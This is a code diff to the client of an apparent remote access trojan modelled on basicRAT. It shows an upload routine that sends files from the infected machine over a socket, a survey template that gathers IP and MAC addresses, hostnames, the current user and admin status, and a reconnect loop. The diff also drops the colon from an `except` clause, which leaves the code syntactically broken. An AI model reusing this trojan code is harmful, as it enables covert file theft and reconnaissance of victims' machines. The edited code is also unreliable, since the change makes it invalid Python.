@@ -71,6 +71,8 @@ def upload(command):
         fileName = str(command[len("download "):])
 
     try:
+        s.send(str(int(int(os.path.getsize(fileName)) / 1024)))
+
         f = open(fileName, 'rb')
         l = f.read(1024)
 
@@ -117,19 +119,19 @@ def info():
 # https://github.com/vesche/basicRAT
 #
     SURVEY_FORMAT = '''
-[-o-] System Platform     - {}
-[-o-] Processor           - {}
-[-o-] Architecture        - {}
-[-o-] Internal IP         - {}
-[-o-] External IP         - {}
-[-o-] MAC Address         - {}
-[-o-] Internal Hostname   - {}
-[-o-] External Hostname   - {}
-[-o-] Hostname Aliases    - {}
-[-o-] FQDN                - {}
-[-o-] Current User        - {}
-[-o-] System Datetime     - {}
-[-o-] Admin Access        - {}'''
+[*] System Platform     - {}
+[*] Processor           - {}
+[*] Architecture        - {}
+[*] Internal IP         - {}
+[*] External IP         - {}
+[*] MAC Address         - {}
+[*] Internal Hostname   - {}
+[*] External Hostname   - {}
+[*] Hostname Aliases    - {}
+[*] FQDN                - {}
+[*] Current User        - {}
+[*] System Datetime     - {}
+[*] Admin Access        - {}'''
 
 
     def run(plat):
@@ -264,7 +266,7 @@ def start():
         try:
             connect()
             main()
-        except:
+        except
             start()
 
 if __name__ == "__main__":
